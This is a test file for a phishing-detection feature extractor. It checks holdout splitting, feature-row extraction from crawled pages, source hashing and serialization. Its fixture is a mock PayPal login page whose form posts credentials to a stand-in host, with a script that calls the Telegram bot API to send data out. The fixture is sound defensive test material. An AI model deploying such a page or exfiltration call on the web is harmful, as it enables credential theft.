import { existsSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import type { CrawlRecord } from "../crawl/crawler.ts";
import {
  type FeatureRow,
  featureRow,
  parseFeatures,
  SIGNAL_SOURCES,
  serializeFeatures,
  sourceHash,
  splitFor,
} from "./features.ts";

const PHISH_HTML = `<!doctype html><html><head><title>PayPal: Log in</title></head><body>
<h1>PayPal</h1>
<form action="https://collect.other.example/p"><input type="email" name="email"><input type="password" name="pw"><button>Log In</button></form>
<script>fetch("https://api.telegram.org/bot123:abc/sendMessage", {method: "POST"})</script>
</body></html>`;

function record(over: Partial<CrawlRecord>): CrawlRecord {
  return {
    schema: 1,
    id: "abc123",
    url: "https://paypal-secure.example.com/login",
    label: "phish",
    group: "openphish",
    crawled_at: 0,
    ok: true,
    status: 200,
    final_url: "https://paypal-secure.example.com/login",
    chain: [],
    snapshot: { identifierFields: 1 } as CrawlRecord["snapshot"],
    gated: true,
    blocked_requests: 0,
    attempt: 1,
    duration_ms: 1,
    ...over,
  };
}

function corpus(html: string | null, id = "abc123"): string {
  const dir = mkdtempSync(path.join(tmpdir(), "warden-features-"));
  mkdirSync(path.join(dir, id));
  if (html !== null) writeFileSync(path.join(dir, id, "page.html"), html);
  return dir;
}

describe("splitFor", () => {
  it("is deterministic, per site, and handles IP hosts", () => {
    expect(splitFor("a.example.com")).toBe(splitFor("b.example.com"));
    expect(splitFor("a.example.com")).toBe(splitFor("a.example.com"));
    expect(["tune", "holdout"]).toContain(splitFor("203.0.113.5"));
  });

  it("holds out roughly 30% of sites", () => {
    const n = 2000;
    let held = 0;
    for (let i = 0; i < n; i++) if (splitFor(`site${i}.example`) === "holdout") held++;
    expect(held / n).toBeGreaterThan(0.25);
    expect(held / n).toBeLessThan(0.35);
  });
});

describe("featureRow", () => {
  it("extracts every signal from a saved phish page, with no host, URL or title in the row", async () => {
    const out = await featureRow(record({}), corpus(PHISH_HTML), () => false);
    if (!out || out === "skip") throw new Error("expected a row");
    expect(out.host).toBe("paypal-secure.example.com");
    expect(out.row).toMatchObject({
      label: "phish",
      group: "openphish",
      gated: true,
      allowlisted: false,
      exfil: { kind: "telegram" },
      url: { brandKeyword: true },
    });
    expect(out.row.brandMismatch?.cues).toBeGreaterThanOrEqual(1);
    const json = JSON.stringify(out.row);
    for (const leak of ["example", "PayPal: Log in", "http"]) expect(json).not.toContain(leak);
  });

  it("returns null outside the Stage 2 surface and skip for a missing page", async () => {
    const dir = corpus(PHISH_HTML);
    expect(await featureRow(record({ ok: false }), dir, () => false)).toBeNull();
    expect(
      await featureRow(
        record({ gated: false, snapshot: { identifierFields: 0 } as CrawlRecord["snapshot"] }),
        dir,
        () => false,
      ),
    ).toBeNull();
    expect(await featureRow(record({}), corpus(null), () => false)).toBe("skip");
  });

  it("handles an IP-literal final URL", async () => {
    const out = await featureRow(
      record({ final_url: "http://203.0.113.5/login" }),
      corpus(PHISH_HTML),
      () => false,
    );
    if (!out || out === "skip") throw new Error("expected a row");
    expect(out.row.url.ipHost).toBe(true);
  });
});

describe("SIGNAL_SOURCES", () => {
  it("covers the row extraction, page parsing, interception filter and PSL/DOM library versions", () => {
    const root = path.resolve(import.meta.dirname, "../../../..");
    for (const s of [
      "packages/eval/src/stage2/feature-row.ts",
      "packages/eval/src/stage2/saved-page.ts",
      "packages/eval/src/crawl/interception.ts",
      "packages/shared/node_modules/tldts/package.json",
      "packages/eval/node_modules/happy-dom/package.json",
    ]) {
      expect(SIGNAL_SOURCES).toContain(s);
    }
    for (const s of SIGNAL_SOURCES) expect(existsSync(path.join(root, s)), s).toBe(true);
  });
});

describe("sourceHash", () => {
  it("changes with signal code but not with score.ts or tests", () => {
    const root = mkdtempSync(path.join(tmpdir(), "warden-hash-"));
    mkdirSync(path.join(root, "s"));
    const write = (f: string, s: string) => writeFileSync(path.join(root, "s", f), s);
    write("signal.ts", "a");
    write("score.ts", "w=1");
    write("signal.test.ts", "t");
    const h = sourceHash(root, ["s"]);
    write("score.ts", "w=2");
    write("signal.test.ts", "t2");
    expect(sourceHash(root, ["s"])).toBe(h);
    write("signal.ts", "b");
    expect(sourceHash(root, ["s"])).not.toBe(h);
  });
});

describe("serializeFeatures / parseFeatures", () => {
  const row: FeatureRow = {
    label: "benign",
    group: "tranco-login",
    split: "tune",
    gated: true,
    allowlisted: true,
    brandMismatch: null,
    exfil: null,
    url: {
      lookalike: false,
      brandKeyword: false,
      ipHost: false,
      tenantPlatform: false,
      deepSubdomain: false,
    },
  };
  const header = {
    header: true as const,
    schema: 1 as const,
    sourceHash: "h",
    generated: "2026-10-07T00:00:00.000Z",
    counts: { benign: 1, phish: 0, skipped: 0 },
  };

  it("round-trips", () => {
    expect(parseFeatures(serializeFeatures(header, [row]))).toEqual({ header, rows: [row] });
  });

  it("rejects a missing header or a malformed line", () => {
    expect(() => parseFeatures(`${JSON.stringify(row)}\n`)).toThrow(/header/);
    expect(() => parseFeatures(`${JSON.stringify(header)}\n{"label":"x"}\n`)).toThrow(/line 2/);
    expect(() => parseFeatures("")).toThrow(/header/);
  });
});
